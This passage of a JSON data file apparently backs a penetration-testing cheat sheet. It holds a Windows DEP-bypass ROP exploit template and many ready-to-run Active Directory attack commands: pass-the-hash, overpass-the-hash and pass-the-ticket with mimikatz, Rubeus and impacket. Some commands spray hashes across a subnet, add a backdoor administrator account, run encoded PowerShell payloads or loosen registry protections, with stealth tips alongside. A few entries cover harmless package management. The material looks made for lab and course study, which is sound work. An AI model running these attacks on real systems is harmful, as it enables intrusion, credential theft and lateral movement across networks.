            "code": "#!/usr/bin/env python3\n\"\"\"DEP Bypass with ROP\"\"\"\n\nimport socket\nimport struct\n\ndef p32(addr):\n    return struct.pack(\"<I\", addr)\n\n# Module base (update after info leak or static analysis)\nBASE = 0x10000000\n\n# Gadget offsets (find with !mona rop)\nGADGETS = {\n    'pop_eax': BASE + 0x1000,\n    'pop_ecx': BASE + 0x1004,\n    'pop_edx': BASE + 0x1008,\n    'pop_ebx': BASE + 0x100c,\n    'pop_ebp': BASE + 0x1010,\n    'pop_esi': BASE + 0x1014,\n    'pop_edi': BASE + 0x1018,\n    'pushad': BASE + 0x101c,\n    'ret': BASE + 0x1020,\n}\n\n# VirtualAlloc address\nVIRTUALALLOC = BASE + 0x2000\n\ndef build_rop_chain():\n    \"\"\"Build ROP chain for VirtualAlloc\"\"\"\n    rop = b\"\"\n\n    # Set up registers for PUSHAD\n    rop += p32(GADGETS['pop_eax'])\n    rop += p32(0x90909090)  # NOP for EAX\n\n    rop += p32(GADGETS['pop_ecx'])\n    rop += p32(0x00000040)  # PAGE_EXECUTE_READWRITE\n\n    rop += p32(GADGETS['pop_edx'])\n    rop += p32(0x00003000)  # MEM_COMMIT | MEM_RESERVE\n\n    rop += p32(GADGETS['pop_ebx'])\n    rop += p32(0x00001000)  # Size\n\n    rop += p32(GADGETS['pop_ebp'])\n    rop += p32(GADGETS['ret'])  # Return after VirtualAlloc\n\n    rop += p32(GADGETS['pop_esi'])\n    rop += p32(VIRTUALALLOC)\n\n    rop += p32(GADGETS['pop_edi'])\n    rop += p32(GADGETS['ret'])  # ROP NOP\n\n    rop += p32(GADGETS['pushad'])\n\n    return rop\n\n# Shellcode\nshellcode = b\"\\xcc\" * 100  # INT3 for testing\n\n# Build exploit\nOFFSET = 260\nbuffer = b\"A\" * OFFSET\nbuffer += build_rop_chain()\nbuffer += b\"\\x90\" * 16\nbuffer += shellcode"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Template with ROP chain support."
          }
        ]
      },
      {
        "title": "Debugging Checklist",
        "codes": [
          {
            "lang": "text",
            "code": "[ ] Verify EIP control at correct offset\n[ ] Confirm return address is reached\n[ ] Check for bad characters in:\n    [ ] Return address\n    [ ] ROP gadget addresses\n    [ ] Shellcode\n[ ] Verify ROP chain executes correctly\n[ ] Confirm VirtualAlloc/VirtualProtect succeeds\n[ ] Check shellcode is reached and executed\n[ ] Verify shell connection"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Systematic debugging approach."
          }
        ]
      },
      {
        "title": "Common Pitfalls [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Frequent issues in exploit development:\n- **Wrong offset**: Re-verify with pattern, account for all fields\n- **Bad characters**: Check all parts of payload, not just shellcode\n- **Stack alignment**: Some functions require 16-byte alignment\n- **DEP**: Check if shellcode location is executable\n- **ASLR**: Verify addresses after reboot\n- **Null terminators**: strcpy-based overflows truncate at NULL",
            "variant": "warning"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "OffSec EXP-301",
        "url": "https://www.offsec.com/courses/exp-301/"
      }
    ],
    "lab": true,
    "notes": [
      {
        "type": "note",
        "content": "Systematic approach for tackling Windows exploit development challenges."
      }
    ]
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "Other Enumeration Tools",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "PingCastle - AD Security Audit",
        "codes": [
          {
            "lang": "bash",
            "code": ".\\PingCastle.exe --healthcheck"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Quick AD security audit with risk scoring. Generates HTML report."
          }
        ]
      },
      {
        "title": "PsLoggedOn - Session Enumeration",
        "codes": [
          {
            "lang": "bash",
            "code": ".\\PsLoggedon.exe\n.\\PsLoggedon.exe \\\\<ComputerName>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Sysinternals tool to find logged-on users."
          }
        ]
      },
      {
        "title": "Plumhound - BloodHound Analysis",
        "codes": [
          {
            "lang": "bash",
            "code": "cd /path/to/PlumHound\nsource bin/activate\nsudo python3 PlumHound.py -x tasks.default.tasks -p <Neo4jPassword>\nfirefox reports/index.html"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Automated BloodHound analysis. Generates HTML reports from Neo4j data."
          }
        ]
      },
      {
        "title": "Remote Service Enumeration",
        "substeps": [
          {
            "title": "Start/Stop Service",
            "codes": [
              {
                "lang": "bash",
                "code": "services.py <Domain>/<AdminUser>:<Password>@<TargetIP> start <ServiceName>\nservices.py <Domain>/<AdminUser>:<Password>@<TargetIP> stop <ServiceName>"
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Requires admin privileges."
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "services.py <Domain>/<User>:<Password>@<TargetIP> list\nservices.py <Domain>/<User>:<Password>@<TargetIP> query <ServiceName>"
          }
        ]
      },
      {
        "title": "View Kerberos Tickets",
        "codes": [
          {
            "lang": "bash",
            "code": "klist"
          },
          {
            "lang": "powershell",
            "code": "klist"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "NetExec",
    "title": "Output Options",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "NetExec",
      "Windows"
    ],
    "steps": [
      {
        "title": "Save to File",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' --shares > shares.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "JSON Output",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' --shares --json > shares.json"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Quiet Mode (No Banner)",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' --shares -q"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Verbose Output",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' --shares -v"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Overpass-the-Hash",
    "title": "Overpass-the-Hash",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Overpass-the-Hash with Mimikatz",
        "codes": [
          {
            "lang": "powershell",
            "code": ".\\mimikatz.exe \"sekurlsa::pth /user:<Username> /domain:<Domain> /ntlm:<NTLMHash> /run:cmd.exe\" \"exit\""
          },
          {
            "lang": "powershell",
            "code": "# With AES256 key (more stealthy)\n.\\mimikatz.exe \"sekurlsa::pth /user:<Username> /domain:<Domain> /aes256:<AES256Key> /run:cmd.exe\" \"exit\""
          },
          {
            "lang": "powershell",
            "code": "# With AES128 key\n.\\mimikatz.exe \"sekurlsa::pth /user:<Username> /domain:<Domain> /aes128:<AES128Key> /run:cmd.exe\" \"exit\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Starts a new process with the injected ticket.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Overpass-the-Hash with Rubeus",
        "codes": [
          {
            "lang": "powershell",
            "code": ".\\Rubeus.exe asktgt /user:<Username> /rc4:<NTLMHash> /ptt"
          },
          {
            "lang": "powershell",
            "code": "# With AES256 key\n.\\Rubeus.exe asktgt /user:<Username> /aes256:<AES256Key> /ptt"
          },
          {
            "lang": "powershell",
            "code": "# Request and save to file\n.\\Rubeus.exe asktgt /user:<Username> /rc4:<NTLMHash> /outfile:tgt.kirbi"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Overpass-the-Hash from Kali",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-getTGT <Domain>/<Username> -hashes :<NTLMHash> -dc-ip <DCIP>"
          },
          {
            "lang": "bash",
            "code": "# Use the ticket\nexport KRB5CCNAME=<Username>.ccache\nimpacket-psexec -k -no-pass <Domain>/<Username>@<TargetFQDN>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Verify Ticket",
        "codes": [
          {
            "lang": "powershell",
            "code": "klist"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks Overpass-the-Hash",
        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Use an NTLM hash or AES key to request a Kerberos TGT. Allows Kerberos authentication with just a hash. Also called Pass-the-Key.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "Overpass-the-Hash",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "Request TGT - Linux",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-getTGT <Domain>/<User> -hashes :<NTHash>\ngetTGT.py -hashes :<NTHash> <Domain>/<User>\ngetTGT.py -aesKey <AESKey> <Domain>/<User>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Load and Verify Ticket - Linux",
        "codes": [
          {
            "lang": "bash",
            "code": "export KRB5CCNAME=<User>.ccache\nexport KRB5CCNAME=$(pwd)/<User>.ccache\nklist"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Use with Impacket Tools",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-psexec <Domain>/<User>@<TargetIP> -k -no-pass\nimpacket-psexec -k -no-pass <TargetFQDN>\nimpacket-secretsdump -k -no-pass <DCFQDN>\nimpacket-wmiexec -k -no-pass <TargetFQDN>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "FQDN required when using Kerberos tickets."
          }
        ]
      },
      {
        "title": "Request TGT - Rubeus (Windows)",
        "codes": [
          {
            "lang": "powershell",
            "code": "Rubeus.exe asktgt /user:<User> /rc4:<NTHash> /ptt\nRubeus.exe asktgt /user:<User> /aes256:<AESKey> /ptt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Use Native Tools After Injection (Windows)",
        "codes": [
          {
            "lang": "powershell",
            "code": "dir \\\\<Hostname>\\c$\nPsExec.exe \\\\<Hostname> cmd.exe\nEnter-PSSession -ComputerName <Hostname>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Use NTLM hash or AES key to request a Kerberos TGT. More stealthy than straight PTH since you use legitimate Kerberos auth.\n**Requirements:** Valid NTLM hash or AES key, network access to DC (port 88), target must be specified by FQDN when using ticket.\n**OPSEC Note:** AES keys are stealthier than RC4/NTLM - RC4 in Kerberos traffic is an anomaly on modern domains."
      }
    ]
  },
  {
    "category": "Overpass-the-Hash",
    "title": "Overpass-the-Hash",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Mimikatz",
      "Pass-the-Hash",
      "Rubeus",
      "Windows"
    ],
    "steps": [],
    "resources": [
      {
        "text": "HackTricks Overpass-the-Hash",
        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Use an NTLM hash or AES key to request a Kerberos TGT. Allows Kerberos authentication with just a hash. Also called Pass-the-Key.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Overpass-the-Hash",
    "title": "Overpass-the-Hash from Kali [Local]",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Mimikatz",
      "Pass-the-Hash",
      "Rubeus",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "text",
        "content": "```bash\nimpacket-getTGT <Domain>/<Username> -hashes :<NTLMHash> -dc-ip <DCIP>\n```"
      },
      {
        "type": "text",
        "content": "```bash\n# Use the ticket\nexport KRB5CCNAME=<Username>.ccache\nimpacket-psexec -k -no-pass <Domain>/<Username>@<TargetFQDN>\n```"
      }
    ]
  },
  {
    "category": "Overpass-the-Hash",
    "title": "Overpass-the-Hash with Mimikatz [Remote]",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Mimikatz",
      "Pass-the-Hash",
      "Rubeus",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Starts a new process with the injected ticket.",
        "variant": "tip"
      },
      {
        "type": "text",
        "content": "```powershell\n.\\mimikatz.exe \"sekurlsa::pth /user:<Username> /domain:<Domain> /ntlm:<NTLMHash> /run:cmd.exe\" \"exit\"\n```"
      },
      {
        "type": "text",
        "content": "```powershell\n# With AES256 key (more stealthy)\n.\\mimikatz.exe \"sekurlsa::pth /user:<Username> /domain:<Domain> /aes256:<AES256Key> /run:cmd.exe\" \"exit\"\n```"
      },
      {
        "type": "text",
        "content": "```powershell\n# With AES128 key\n.\\mimikatz.exe \"sekurlsa::pth /user:<Username> /domain:<Domain> /aes128:<AES128Key> /run:cmd.exe\" \"exit\"\n```"
      }
    ]
  },
  {
    "category": "Overpass-the-Hash",
    "title": "Overpass-the-Hash with Rubeus [alternative]",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Mimikatz",
      "Pass-the-Hash",
      "Rubeus",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "text",
        "content": "```powershell\n.\\Rubeus.exe asktgt /user:<Username> /rc4:<NTLMHash> /ptt\n```"
      },
      {
        "type": "text",
        "content": "```powershell\n# With AES256 key\n.\\Rubeus.exe asktgt /user:<Username> /aes256:<AES256Key> /ptt\n```"
      },
      {
        "type": "text",
        "content": "```powershell\n# Request and save to file\n.\\Rubeus.exe asktgt /user:<Username> /rc4:<NTLMHash> /outfile:tgt.kirbi\n```"
      }
    ]
  },
  {
    "category": "Linux Enumeration",
    "title": "Package Management - DPKG (Debian)",
    "tags": [
      "Discovery",
      "Enumeration",
      "Linux"
    ],
    "steps": [
      {
        "title": "List Installed Packages",
        "codes": [
          {
            "lang": "bash",
            "code": "dpkg --get-selections"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Install Debian Packages",
        "codes": [
          {
            "lang": "bash",
            "code": "# Install all .deb files in current directory\ndpkg -i *.deb"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Remove Package",
        "codes": [
          {
            "lang": "bash",
            "code": "dpkg -r <PackageName>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Linux Enumeration",
    "title": "Package Management - RPM (Red Hat)",
    "tags": [
      "Discovery",
      "Enumeration",
      "Linux"
    ],
    "steps": [
      {
        "title": "List Installed Packages",
        "codes": [
          {
            "lang": "bash",
            "code": "rpm -qa"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Install RPM Packages",
        "codes": [
          {
            "lang": "bash",
            "code": "# Install all .rpm files in current directory\nrpm -ivh *.rpm"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Remove Package",
        "codes": [
          {
            "lang": "bash",
            "code": "rpm -e <PackageName>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Mimikatz",
    "title": "Pass-the-Hash",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [
      {
        "title": "Pass-the-Hash with Mimikatz",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # privilege::debug\nmimikatz # sekurlsa::pth /user:<Username> /domain:<Domain> /ntlm:<NTLMHash> /run:cmd.exe"
          },
          {
            "lang": "bash",
            "code": "mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Opens new command prompt with injected credentials.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Pass-the-Hash with AES256 Key",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # sekurlsa::pth /user:<Username> /domain:<Domain> /aes256:<AES256Key> /run:cmd.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "AES keys are stealthier than NTLM hashes.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Pass-the-Hash for Local Account",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # sekurlsa::pth /user:Administrator /domain:. /ntlm:<NTLMHash> /run:cmd.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Use `.` for local domain.",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "Pass-the-Hash",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "psexec",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-psexec <Domain>/<User>@<TargetIP> -hashes :<NTHash>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "wmiexec",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-wmiexec <Domain>/<User>@<TargetIP> -hashes :<NTHash>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "smbexec",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-smbexec <Domain>/<User>@<TargetIP> -hashes :<NTHash>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "atexec",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-atexec <Domain>/<User>@<TargetIP> -hashes :<NTHash> \"whoami\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "NetExec",
        "codes": [
          {
            "lang": "bash",
            "code": "netexec smb <TargetIP> -u <User> -H <NTHash> -d <Domain> -x \"whoami\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Mimikatz",
        "codes": [
          {
            "lang": "bash",
            "code": "privilege::debug\nsekurlsa::pth /user:<User> /domain:<Domain> /ntlm:<NTHash> /run:cmd.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Pass-the-Hash",
    "title": "Pass-the-Hash (PtH)",
    "tags": [
      "Impacket",
      "Lateral_Movement",
      "Mimikatz",
      "Pass-the-Hash",
      "Windows"
    ],
    "steps": [
      {
        "title": "Method Comparison",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "**psexec** - Port 445 - Full shell - Bad OPSEC - Writes binary, triggers AV\n**smbexec** - Port 445 - Full shell - Medium OPSEC - No binary, noisy service creation\n**wmiexec** - Port 135 - Semi-interactive - Good OPSEC - Slower, sometimes unstable\n**atexec** - Port 445 - No shell - Good OPSEC - Single command via Task Scheduler\n**evil-winrm** - Port 5985 - Full shell - Good OPSEC - Best shell, needs WinRM enabled\n**netexec** - Port 445 - No shell - Good OPSEC - Mass spray, quick checks"
          }
        ]
      },
      {
        "title": "Hash Format Reference",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "**LM Hash:** `aad3b435b51404eeaad3b435b51404ee` (disabled/empty)\n**NT Hash:** 32-character hex string\n**Full Format:** `LMHash:NTHash`\n**Empty LM:** Use `aad3b435b51404eeaad3b435b51404ee` as LM portion"
          }
        ]
      },
      {
        "title": "Impacket psexec",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-psexec <Domain>/<Username>@<TargetIP> -hashes :<NTHash>"
          },
          {
            "lang": "bash",
            "code": "impacket-psexec Administrator@<TargetIP> -hashes aad3b435b51404eeaad3b435b51404ee:<NTHash>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Impacket wmiexec",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-wmiexec <Domain>/<Username>@<TargetIP> -hashes :<NTHash>"
          },
          {
            "lang": "bash",
            "code": "impacket-wmiexec -hashes :<NTHash> <User>@<TargetIP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Impacket smbexec",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-smbexec <Domain>/<Username>@<TargetIP> -hashes :<NTHash>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Impacket atexec",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-atexec -hashes :<NTHash> <Domain>/<Username>@<TargetIP> \"whoami\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true,
        "notes": [
          {
            "type": "note",
            "content": "Single command execution via Task Scheduler.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "evil-winrm",
        "codes": [
          {
            "lang": "bash",
            "code": "evil-winrm -i <TargetIP> -u <Username> -H <NTHash>"
          },
          {
            "lang": "bash",
            "code": "evil-winrm -i <TargetIP> -u Administrator -H <NTHash> -s /scripts/ -e /executables/"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "NetExec",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -H <NTHash>"
          },
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -H <NTHash> -x 'whoami'"
          },
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -H <NTHash> --local-auth"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Spray Hash Across Subnet",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb 192.168.1.0/24 -u Administrator -H <NTHash> --local-auth"
          },
          {
            "lang": "bash",
            "code": "nxc smb 192.168.1.0/24 -u <Username> -H <NTHash> -d <Domain>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "xfreerdp - RDP",
        "codes": [
          {
            "lang": "bash",
            "code": "xfreerdp /v:<TargetIP> /u:<Username> /pth:<NTHash>"
          },
          {
            "lang": "bash",
            "code": "xfreerdp /v:<TargetIP> /u:<Username> /pth:<NTHash> /restricted-admin"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true,
        "notes": [
          {
            "type": "note",
            "content": "Requires Restricted Admin Mode enabled on target.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Mimikatz",
        "codes": [
          {
            "lang": "bash",
            "code": ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:<Username> /rc4:<NTHash> /domain:<Domain> /run:cmd.exe\" \"exit\""
          },
          {
            "lang": "bash",
            "code": ".\\mimikatz.exe \"sekurlsa::pth /user:Administrator /rc4:<NTHash> /domain:. /run:powershell.exe\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Invoke-TheHash - SMB",
        "codes": [
          {
            "lang": "powershell",
            "code": "Import-Module .\\Invoke-TheHash.psd1\nInvoke-SMBExec -Target <TargetIP> -Domain <Domain> -Username <Username> -Hash <NTHash> -Command \"whoami\""
          },
          {
            "lang": "powershell",
            "code": "Invoke-SMBExec -Target <TargetIP> -Domain <Domain> -Username <Username> -Hash <NTHash> -Command \"net user attacker Password123 /add && net localgroup administrators attacker /add\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Invoke-TheHash - WMI",
        "codes": [
          {
            "lang": "powershell",
            "code": "Import-Module .\\Invoke-TheHash.psd1\nInvoke-WMIExec -Target <TargetIP> -Domain <Domain> -Username <Username> -Hash <NTHash> -Command \"powershell -e <Base64Payload>\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "UAC Considerations",
        "substeps": [
          {
            "title": "Check LocalAccountTokenFilterPolicy",
            "codes": [
              {
                "lang": "powershell",
                "code": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false
          },
          {
            "title": "Enable PtH for Local Admins",
            "codes": [
              {
                "lang": "powershell",
                "code": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": true,
            "local": false,
            "postNotes": [
              {
                "type": "note",
                "content": "**0** = Only RID-500 Administrator can PtH (default)\n**1** = All local admins can PtH"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "UAC limits Pass-the-Hash for non-RID 500 local accounts.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Enable Restricted Admin Mode",
        "codes": [
          {
            "lang": "powershell",
            "code": "reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Required for Pass-the-Hash via RDP.",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "HackTricks Pass-the-Hash",
        "url": "https://book.hacktricks.xyz/windows-hardening/lateral-movement/pass-the-hash"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Authenticate using NTLM hash without knowing the plaintext password. Works because NTLM hashes are not salted.",
        "variant": "info"
      },
      {
        "type": "note",
        "content": "**Requirements:**\n- Target user must be local admin on target machine\n- Network access to SMB (445), WMI (135+dynamic), or WinRM (5985/5986)",
        "variant": "important"
      }
    ]
  },
  {
    "category": "Mimikatz",
    "title": "Pass-the-Ticket",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [
      {
        "title": "Export All Tickets",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # privilege::debug\nmimikatz # sekurlsa::tickets /export"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Saves all tickets as `.kirbi` files."
          }
        ]
      },
      {
        "title": "Inject Ticket into Current Session",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # kerberos::ptt <ticket.kirbi>"
          },
          {
            "lang": "bash",
            "code": "mimikatz # kerberos::ptt [0;3e7]-2-0-40e10000-Administrator@krbtgt-CORP.LOCAL.kirbi"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "List Cached Tickets",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # kerberos::list"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Purge All Tickets",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # kerberos::purge"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Clear tickets before injecting new ones.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Pass-the-Ticket",
    "title": "Pass-the-Ticket",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Export Tickets from Memory",
        "codes": [
          {
            "lang": "powershell",
            "code": ".\\mimikatz.exe \"sekurlsa::tickets /export\" \"exit\""
          },
          {
            "lang": "powershell",
            "code": "# Export specific ticket types\n.\\Rubeus.exe dump /nowrap"
          },
          {
            "lang": "powershell",
            "code": "# Dump current user's tickets\n.\\Rubeus.exe triage"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Inject Ticket with Mimikatz",
        "codes": [
          {
